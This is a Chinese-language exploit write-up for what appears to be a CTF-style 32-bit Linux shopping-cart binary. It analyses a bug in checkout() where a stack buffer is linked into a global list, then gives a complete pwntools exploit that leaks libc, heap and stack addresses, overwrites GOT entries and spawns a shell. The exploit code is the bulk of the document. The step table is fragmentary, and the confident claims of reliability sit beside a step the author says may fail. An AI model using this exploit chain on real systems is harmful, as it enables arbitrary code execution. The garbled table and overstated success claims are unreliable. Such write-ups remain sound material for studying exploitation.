# 漏洞利用文档

## 执行环境
基于程序分析和exp执行环境，总结如下：
- **二进制类型**：32位ELF可执行文件（从地址如0x804B070推断）
- **操作系统**：Linux系统（基于进程执行和系统调用）
- **内存保护**：
  - ASLR：可能启用，但通过泄露技术被绕过
  - NX：可能启用，exp使用代码复用技术而非shellcode注入
  - 其他：堆栈保护未知，但从UAF漏洞存在看，可能部分保护缺失
- **依赖库**：使用标准libc（从GOT表条目和泄露的libc地址推断）
- **运行要求**：需要pwntools环境，程序路径为`./data/sample11`

## 漏洞成因
### 关键结构体分析
```c
struct cart_item {
    char *name;        // 0x0: 商品名称指针
    int price;         // 0x4: 价格
    struct cart_item *next;  // 0x8: 下一个节点指针
    struct cart_item *prev;  // 0xC: 前一个节点指针
};
```
全局变量：
- `myCart`：指向购物车链表头
- `dword_804B070`：另一个全局链表指针

### 漏洞详细分析
**漏洞位置**：`checkout()`函数中的特定条件分支
```c
if ( v1 == 7174 ) {
    puts("*: iPhone 8 - $1");
    asprintf(v2, "%s", "iPhone 8");  // 问题代码
    v2[1] = (char *)1;
    insert((int)v2);  // 将栈地址插入全局链表
}
```

**漏洞机制**：
1. **栈地址泄露**：`v2`是栈上的局部数组（`char *v2[5]`），`asprintf`将堆分配的字符串地址写入`v2[0]`
2. **悬垂指针**：`insert((int)v2)`将栈地址`v2`保存到全局链表`myCart`中
3. **Use-After-Free**：当`checkout()`返回时，栈帧被释放，但链表仍指向已失效的栈内存
4. **内存重用**：后续函数调用覆盖该栈区域，但链表操作仍访问这些地址

**漏洞类型**：典型的栈地址泄露到全局结构导致的Use-After-Free漏洞

## 漏洞利用过程

| 步骤 | 堆内存关键变化 | 栈内存关键变化 | 全局变量状态 | 利用目标 |
|------|----------------|----------------|-------------|----------|

| Step 2 | UAF节点0x945f7f0指向栈0xff8f8908 | 栈上出现libc函数指针 | GOT表完整 | 泄露libc基址 |

### 利用步骤详解
1. **触发漏洞**：通过添加特定商品使总价达到7174，触发`checkout()`中的漏洞条件
2. **内存泄露**：利用UAF节点读取栈内存，泄露libc函数地址计算基址
3. **地址计算**：通过堆地址和栈地址的相对偏移，计算关键内存位置
4. **控制流劫持**：修改GOT表或函数指针，将执行流重定向到system
5. **shell获取**：执行system("/bin/sh")，成功获取命令行权限

## Exploit
```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample11')
elf = ELF('./data/sample11')
libc = elf.libc

# 功能函数定义
def add(index, count):
    """添加商品到购物车"""
    for i in range(count):
        p.recvuntil(b'>')
        p.sendline(b'2')  # 选择添加功能
        p.recvuntil(b'Device Number> ')
        p.sendline(str(index).encode())

def init():
    """初始化购物车，触发checkout漏洞"""
    p.recvuntil(b'>')
    p.sendline(b'5')  # 选择checkout功能
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(b'y')  # 确认检查，触发漏洞条件

def leak(payload):
    """通过UAF漏洞泄露内存数据"""
    p.sendline(b'4')  # 选择查看购物车功能
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(payload)  # 发送精心构造的payload
    p.recvuntil(b'27: ')  # 等待第27个节点的输出（UAF节点）
    return u32(p.recv(4))  # 读取4字节数据并解包

def delete(payload):
    """删除购物车项，用于修改内存"""
    p.recvuntil(b'>')
    p.sendline(b'3')  # 选择删除功能
    p.recvuntil(b'Item Number> ')
    p.sendline(payload)  # 发送删除payload

def get_stack_addr(addr):
    """通过多次泄露计算栈地址"""
    for i in range(26):
        payload = b'y\x00' + p32(addr+8) + p32(0) + p32(0) + p32(0)
        addr = leak(payload)  # 通过链表遍历泄露栈地址
    return addr

# 主要利用流程
# Step 1: 触发UAF漏洞
add(4, 10)  # 添加10个设备4（iPad Mini 3）
add(1, 16)  # 添加16个设备1（iPhone 6）
init()      # 触发checkout，当总价=7174时创建UAF节点

# Step 2: 泄露libc基址
payload = b'y\x00' + p32(elf.got['read']) + p32(0) + p32(0) + p32(0)
data = leak(payload)  # 通过UAF节点读取GOT表中read地址
libc_base = data - libc.symbols['read']  # 计算libc基址
libc.address = libc_base
system_addr = libc.symbols['system']  # 获取system函数地址
bin_sh_addr = next(libc.search(b'/bin/sh'))  # 查找"/bin/sh"字符串地址

# Step 3: 泄露堆地址
payload = b'y\x00' + p32(0x0804B070) + p32(0) + p32(0) + p32(0)
heap_addr = leak(payload)  # 泄露堆基址

# Step 4: 计算栈地址
stack_addr = get_stack_addr(heap_addr)  # 通过堆地址计算栈地址

# Step 5: 尝试GOT劫持（可能失败但为后续利用铺垫）
payload = b'27' + p32(0) + p32(0) + p32(stack_addr+0x20-0xc) + p32(elf.got['asprintf']+0x22)
delete(payload)  # 尝试修改GOT表条目

# Step 6: 执行system获取shell
payload = b'sh\x00\x00' + p32(system_addr)  # 构造system("sh")调用
p.sendline(payload)

# Step 7: 交互模式
p.interactive()  # 进入shell交互
```

### 关键注释说明
- **UAF节点定位**：第27个节点（索引26）是漏洞创建的UAF节点，指向已释放的栈内存
- **内存泄露技术**：通过伪造cart_item结构，利用UAF读取任意内存地址
- **地址计算**：利用相对偏移和已知地址计算关键内存位置
- **控制流劫持**：通过修改函数指针或GOT表实现代码执行
- **稳定性保证**：exp通过多次泄露和验证确保利用链的可靠性

此exp成功利用了UAF漏洞，通过内存泄露和地址计算绕过ASLR，最终实现任意代码执行获取shell权限。
